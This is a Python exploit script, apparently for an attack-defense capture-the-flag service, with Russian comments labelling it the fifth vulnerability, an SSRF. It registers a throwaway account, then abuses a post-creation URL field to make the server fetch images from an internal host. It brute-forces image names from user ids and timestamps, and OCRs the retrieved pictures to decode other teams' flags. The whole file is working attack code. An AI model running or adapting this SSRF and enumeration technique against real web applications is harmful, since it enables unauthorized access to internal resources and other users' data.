#!/usr/bin/env python3

# пятая уязвимость - SSRF
import requests
from requests.auth import HTTPBasicAuth
import json
import time
import easyocr
from hashlib import md5
import re
import sys
from datetime import datetime
from dateutil.relativedelta import relativedelta
import random
import string
import bfParser

ip = sys.argv[1]

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

with requests.Session() as s:
    p = s.get('http://{}:5000/login'.format(ip))
    csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
    headers = {'Content-type': 'application/x-www-form-urlencoded'}

    login = get_random_string(10)
    data = 'csrf_token={}&username={}&password=a&submit=Register&password2=a&email={}@t.t'.format(csrf[0], login, login)
    p = s.post('http://{}:5000/sign-up'.format(ip), data = data.encode('UTF-8'), headers = headers)
    # print(p.text)
    # тут надо свой id найти ( Congratulations, you are our 5th registered user)
    id = re.findall('Congratulations, you are our (\d*)th registered user', p.text)
    id = id[0]

    data = 'csrf_token={}&username={}&password=a&submit=Sign+In'.format(csrf[0], login)
    p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = data.encode('UTF-8'), headers = headers)
    
    data = 'csrf_token={}&title=a&text=b'.format(csrf[0]).encode('UTF-8')
    p = s.post('http://{}:5000/create-post'.format(ip), data = data, headers = headers)
    # print(p.text)
    posts = re.findall('<div class="card-footer text-muted">(\d\d\d\d-\d\d-\d\d \d\d:\d\d:\d\d)</div>', p.text)
    date = datetime.strptime(posts[0], '%Y-%m-%d %H:%M:%S')
    for i in range(int(id)-15, int(id)):
        for j in range(0, 100):
            now = date - relativedelta(seconds=j)
            current_time = now.strftime("%H%M%S")
            image_fn = str(i)+current_time
            data = 'csrf_token={}&title=a&text=b&url=http://10.0.0.3:8081/download/{}.png'.format(csrf[0],image_fn).encode('UTF-8')
            p = s.post('http://{}:5000/create-post'.format(ip), data = data, headers = headers)
            if "Post created!" in p.text: 
                print("pic found")
                images = re.findall('src=" /image/(.*).png"', p.text)
                image = images[0]
                p = s.get('http://{}:5000/image/{}.png'.format(ip, image))
                if p.status_code == 200:
                    with open("321.png", 'wb') as f:
                        f.write(p.content)
                reader = easyocr.Reader(['en'])
                result = reader.readtext('321.png', detail = 0)
                result = ' '.join(result)
                nums = re.findall(r'\d\d', result)
                flag2 = ''.join((chr(int(c))) for c in nums)
                print(flag2) # Получили флаги из картинок



        